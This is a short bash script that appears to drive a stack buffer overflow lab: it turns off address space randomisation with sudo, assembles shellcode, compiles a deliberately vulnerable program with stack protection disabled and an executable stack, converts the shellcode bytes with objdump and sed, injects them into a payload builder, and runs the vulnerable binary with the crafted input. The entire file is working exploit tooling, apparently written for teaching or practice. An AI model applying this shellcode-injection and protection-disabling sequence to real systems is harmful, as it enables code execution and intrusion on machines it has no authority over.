#!/usr/bin/env bash

ROOT="/tmp/crack"

rm -rf $ROOT

[ -d $ROOT ] || mkdir -p $ROOT

ESP=$ROOT/esp
BUILD_ATTACK=$ROOT/build_attack.py
overflow=$ROOT/overflow
shellcode=$ROOT/shellcode.o

randomize="/proc/sys/kernel/randomize_va_space"

[ 0 -eq `cat $randomize` ] || {
	echo 0 | sudo tee $randomize
}

[ -f $shellcode ] || {
	nasm -f elf -o $shellcode shellcode.asm || exit 1
}

[ -f $ESP ] || {
	gcc -o $ESP esp.c -m32 || exit 1
}

[ -f $BUILD_ATTACK ] || cp build_attack.py $BUILD_ATTACK
[ -f $overflow ] || {
	gcc -o $overflow bob.c -fno-stack-protector -z execstack -m32 || exit 1
}

# run by hand: objdump -s $shellcode | sed -n '/^ [0-9]\{4\}/p' | awk '{for (i = 2; i < NF; i++) printf("%s", $i)}' | sed 's/\(..\)/\\x\1/g
SHELLCODE="`objdump -s $shellcode | sed -n '/^ [0-9]\{4\}/p' | awk '{for (i = 2; i < NF; i++) printf("%s", $i)}' | sed 's/\(..\)/\\\\\\\x\1/g'`"

sed -i '/shellcode=/c shellcode=b\"'$SHELLCODE'\"' $BUILD_ATTACK

cd $ROOT

$BUILD_ATTACK `$ESP | awk '{print $NF}'` > $ROOT/badfile

$overflow "`cat $ROOT/badfile`"

